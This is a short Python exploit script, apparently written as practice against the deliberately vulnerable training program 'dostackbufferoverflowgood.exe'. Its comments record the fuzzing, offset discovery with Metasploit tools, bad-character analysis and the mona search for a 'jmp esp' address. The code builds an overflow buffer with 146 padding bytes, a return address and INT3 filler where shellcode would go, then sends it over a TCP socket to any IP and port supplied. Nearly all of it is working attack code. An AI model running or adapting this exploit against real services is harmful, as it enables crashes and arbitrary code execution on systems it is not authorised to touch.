import socket
import struct
import sys

# [*]Fuzzing 127.0.0.1 31337 with 45302 bytes...
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 45300 |xclip -selection clipboard
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
# [*] Exact match at offset 146
# badchars = [0x00,0x0a]
# !mona jmp -r esp -cpb "\x00\x0A"
# Log data, item 4 Address=080414C3 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
# Log data, item 3 Address=080416BF Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood

def exploit(ip,port=31337):

	jmp_esp = struct.pack("<I",0x080414c3)
	
	buf = bytearray()
	buf += "a" *146
	buf += jmp_esp
	buf += "\xcc"*(45300 - len(buf))
	buf += "\n"

	print("[*]Sending evil buf {} {} with {} bytes...".format(ip,port,len(buf)))

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send(buf)
	s.close()

if __name__=="__main__":
	# do magic
	
	usage = "[*]Usage: {} [ip] [port]".format(sys.argv[0])

	if len(sys.argv) != 3:
		print(usage)
		sys.exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	exploit(str(ip),int(port))